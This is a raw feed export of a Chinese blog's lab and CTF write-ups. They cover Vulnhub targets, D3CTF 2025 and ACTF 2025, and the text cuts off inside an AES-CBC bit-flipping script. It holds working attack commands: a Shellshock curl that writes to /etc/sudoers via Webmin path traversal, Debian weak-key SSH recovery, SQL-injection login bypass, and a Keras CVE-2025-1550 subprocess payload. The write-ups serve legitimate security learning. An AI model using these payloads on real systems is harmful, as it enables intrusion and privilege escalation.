0.9.8e</code>这个版本的<code>OpenSSL</code>可以<strong>根据公钥找到私钥</strong>，实现<strong>免密登陆</strong>（可是你没登陆靶机怎么知道哪个版本呢？）</p><p><code>perl 2017.pl 192.168.32.128 10000 /home/vmware/.ssh/authorized_keys 0</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQuiE5Wy9DwYVfLrkkcDB2uubtMzGw9hl3smD/OwUyXc/lNED7MNLS8JvehZbMJv1GkkMHvv1Vfcs6FVnBIfPBz0OqFrEGf+a4JEc/eF2R6nIJDIgnjBVeNcQaIM3NOr1rYPzgDwAH/yWoKfzNv5zeMUkMZ7OVC54AovoSujQC/VRdKzGRhhLQmyFVMH9v19UrLgJB6otLcr3d8/uAB2ypTw+LmuIPe9zqrMwxskdfY4Sth2rl6D3bq6Fwca+pYh++phOyKeDPYkBi3hx6R3b3ETZlNCLJjG7+t7kwFdF02Iuw== vmware@ubuntuvm</span><br></pre></td></tr></table></figure><p>这个版本的<code>OpenSSH</code>用了伪随机数获取密钥，我们可以用伪随机数生成器<code>PRG</code>(pseudo random number generator)进行私钥的破解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit prng </span><br><span class="line">searchsploit prng -m 5622.txt</span><br><span class="line">cat 5622.txt</span><br><span class="line">wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2</span><br><span class="line">tar -jxvf 5622.tar.bz2</span><br><span class="line">grep -lr &#x27;AAAAB3NzaC1yc2EAAAABIwAAAQEAzASM/LKs+FLB7zfmy14qQJUrsQsEOo9FNkoilHAgvQ&#x27;</span><br><span class="line">cp rsa/2048/d8629ce6dc8f2492e1454c13f46adb26-4566 private_key</span><br></pre></td></tr></table></figure><p><code>ssh -i private_key -oKexAlgorithms=diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 -oHostKeyAlgorithms=ssh-rsa,ssh-dss -oPubkeyAcceptedKeyTypes=ssh-rsa,ssh-dss vmware@192.168.32.128 -o macs=hmac-sha1-96</code></p><p>难绷，<code>windows</code>这边也登不上去了，还是需要密码，<code>kali</code>直接<code>command-line line 0: Bad key types &#39;ssh-rsa,ssh-dss&#39;.</code>，不会整了，蒜鸟蒜鸟</p><p>所以，这一步正常的话是可以通过私钥文件，免密登陆的</p><h3 id="shellshock漏洞提权"><a href="#shellshock漏洞提权" class="headerlink" title="shellshock漏洞提权"></a>shellshock漏洞提权</h3><p><code>bash --version</code>，<code>GNU bash, version 3.2.25(1)-release (i486-pc-linux-gnu)</code>，远低于4.3版本，我们可以用<strong>shellshock漏洞</strong>提权</p><p><code>vim shellshockexp.cgi</code>，写入<code>#!/bin/bash</code></p><p><code>curl &#39;http://192.168.32.128:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/home/vmware/shellshockexp.cgi&#39; -A &#39;() &#123; :; &#125;; /bin/echo &quot;vmware ALL=(ALL)NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers&#39;</code></p><p>好吧，这一步也不行，成功的情况只返回一行？<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;h1&gt;Error - Missing Content-Type Header&lt;/h1&gt;</span><br><span class="line">&lt;pre&gt;Failed to exec /usr/local/webmin/mscstyle3/unauthenticated/../../../../../../../../../../../../../../home/vmware/shellshockexp.cgi : Permission denied</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure></p><p>正常来说，<code>sudo /bin/bash</code>即可提权成功了</p><p>同样的，<strong>Linux内核版本</strong>也较低，可以尝试<strong>内核提权</strong>，找好<code>exp</code>即可<br><code>Linux ubuntuvm 2.6.22-14-server</code></p><h2 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h2><p>需要关注一些特殊文件的读取权限，看看能否成为突破口；还有就是关注低版本服务的漏洞</p><h1 id="holynix-未完成"><a href="#holynix-未完成" class="headerlink" title="holynix(未完成)"></a>holynix(未完成)</h1><h2 id="主机发现与端口扫描-7"><a href="#主机发现与端口扫描-7" class="headerlink" title="主机发现与端口扫描"></a>主机发现与端口扫描</h2><p><code>nmap -sn 192.168.32.0/24</code><br><code>192.168.32.130</code><br><code>nmap --min-rate 10000 -p- 192.168.32.130</code><br>只扫出了80端口<br>扫描脚本也没什么东西，SQL注入这些</p><h2 id="web渗透-9"><a href="#web渗透-9" class="headerlink" title="web渗透"></a>web渗透</h2><p>一进去是个登陆界面，不是市面上的cms<br>一开始在用户名处试万能密码，没反应，那就看看报错位置，账密都输入单引号，然后报错了<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL Error:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&#x27;&#x27;&#x27;&#x27; at line 1</span><br><span class="line">SQL Statement:SELECT * FROM accounts WHERE username=&#x27;\&#x27;&#x27; AND password=&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><br>原来用户名这里被转义了</p><p><code>xx/&#39; or 1=1#</code></p><p>发现上传，但没权限<code>Home directory uploading disabled for user alamo</code><br><code>Security</code>这里可以文件读取，但get看不见请求，尝试post<br><code>http://192.168.32.130/index.php?page=ssp.php</code><br>请求体<code>B=Display+File&amp;text_file_name=ssp%2Femail.txt</code><br><code>text_file_name</code>可以实现文件读取</p><p>(可能不更新了)……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;此文诞生于本人实习期间，属于是&lt;strong&gt;摸鱼成果&lt;/strong&gt;，虽然但是也没打几个靶场，毕竟哪有这么爽的鱼可以摸&lt;/p&gt;
&lt;p&gt;只能说&lt;code&gt;vulnhub&lt;/code&gt;这边的靶场比较偏向教育性质，适合新手，可能进阶的那些我还没接触()&lt;/p&gt;
&lt;p&gt;在某次训</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>零散Web题记录</title>
    <link href="https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://hvang10.github.io/2025/06/01/%E9%9B%B6%E6%95%A3web%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2025-05-31T18:44:13.000Z</published>
    <updated>2025-05-31T18:58:02.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="D3CTF2025-d3model"><a href="#D3CTF2025-d3model" class="headerlink" title="D3CTF2025 - d3model"></a>D3CTF2025 - d3model</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> keras</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_valid_model</span>(<span class="params">modelname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        keras.models.load_model(modelname)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;index.html&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No file part&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;No selected file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    MAX_FILE_SIZE = <span class="number">50</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 50MB</span></span><br><span class="line">    file.seek(<span class="number">0</span>, os.SEEK_END)</span><br><span class="line">    file_size = file.tell()</span><br><span class="line">    file.seek(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_size &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;File size exceeds 50MB limit&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line">    </span><br><span class="line">    filepath = os.path.join(<span class="string">&#x27;./&#x27;</span>, <span class="string">&#x27;test.keras&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(filepath):</span><br><span class="line">        os.remove(filepath)</span><br><span class="line">    file.save(filepath)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> is_valid_model(filepath):</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;Model is valid&#x27;</span>&#125;), <span class="number">200</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> jsonify(&#123;<span class="string">&#x27;error&#x27;</span>: <span class="string">&#x27;Invalid model file&#x27;</span>&#125;), <span class="number">400</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>这题很明显，唯一的漏洞利用点在<code>is_valid_model()</code>函数，搜索<code>keras.models.load_model()</code>漏洞，发现了最近的<code>CVE-2025-1550</code>，找到了<a href="https://blog.huntr.com/inside-cve-2025-1550-remote-code-execution-via-keras-models">攻击参考博客</a></p><p>然后比赛的时候没打出来。。。<br>赛后发现是，对<strong>python的subprocess模块</strong>了解还是不够深入（上次记录过一次，但还是忘了，emmm）</p><p>需要修改的地方为<code>&quot;inbound_nodes&quot;: [&#123;&quot;args&quot;: [[&quot;env &gt;&gt; index.html&quot;]], &quot;kwargs&quot;: &#123;&quot;bufsize&quot;: -1, &quot;shell&quot;: True&#125;&#125;]</code><br><code>json文件</code>也相对应做修改，不然的话，命令无法<strong>通过shell执行</strong>。。。</p><blockquote><p>如果shell为True，那么指定的命令将通过shell执行。如果我们需要访问某些shell的特性，如管道、文件名通配符、环境变量扩展功能，这将是非常有用的。</p></blockquote><p>还有就是这题貌似是<strong>不出网</strong>的，但<code>docker</code>文件里面告诉了我们<code>flag</code>在<strong>环境变量</strong>中，并且只有<code>index.html</code>可写。。。</p><p>最简单的题没打出来……</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;D3CTF2025-d3model&quot;&gt;&lt;a href=&quot;#D3CTF2025-d3model&quot; class=&quot;headerlink&quot; title=&quot;D3CTF2025 - d3model&quot;&gt;&lt;/a&gt;D3CTF2025 - d3model&lt;/h1&gt;&lt;figure c</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ACTF2025</title>
    <link href="https://hvang10.github.io/2025/04/26/ACTF2025/"/>
    <id>https://hvang10.github.io/2025/04/26/ACTF2025/</id>
    <published>2025-04-26T09:21:20.000Z</published>
    <updated>2025-05-02T17:44:43.553Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h2><blockquote><p>签到：<a href="https://github.com/team-s2/ACTF-2025">https://github.com/team-s2/ACTF-2025</a></p></blockquote><p><img src="https://picx.zhimg.com/80/v2-be1c2454925cc232fe32bdc9dce6ec1a_1440w.png" alt=""><br><strong>ACTF{w3lc0ME2aCtf2O25h@veAn1ceDAY}</strong></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h2><blockquote><p>Web不够，其他来凑</p></blockquote><p>这题也算是<code>web</code>吧，<strong>AES-CBC字节翻转攻击</strong></p><p>先随便注册个账号登进去，拿到<code>server code (encoded)</code>，解<code>base64</code>即可得到<strong>题目源码</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad, unpad</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass(<span class="params">kw_only=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        cookie_json = cipher.decrypt(padded)</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        _ = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = cipher.decrypt(padded)</span><br><span class="line">        cookie_json_bytes = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">        cookie_json = cookie_json_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_dict = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, cookie_dict.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_dict = asdict(user)</span><br><span class="line">    cookie_json = json.dumps(cookie_dict)</span><br><span class="line">    cookie_json_bytes = cookie_json.encode()</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    padded = pad(cookie_json_bytes, <span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(</span><br><span class="line">                    time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>思路很明确，伪造<code>admin</code>，因为现在<strong>字节翻转攻击</strong>前人的研究都挺多了的，我们直接拷打<code>ChatGPT</code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">BLOCK_SIZE = <span class="number">16</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flip_bytes</span>(<span class="params">cookie_b: <span class="built_in">bytes</span>, offset: <span class="built_in">int</span>, orig: <span class="built_in">bytes</span>, target: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    对 cookie 中位于指定 offset 处的前一块（IV 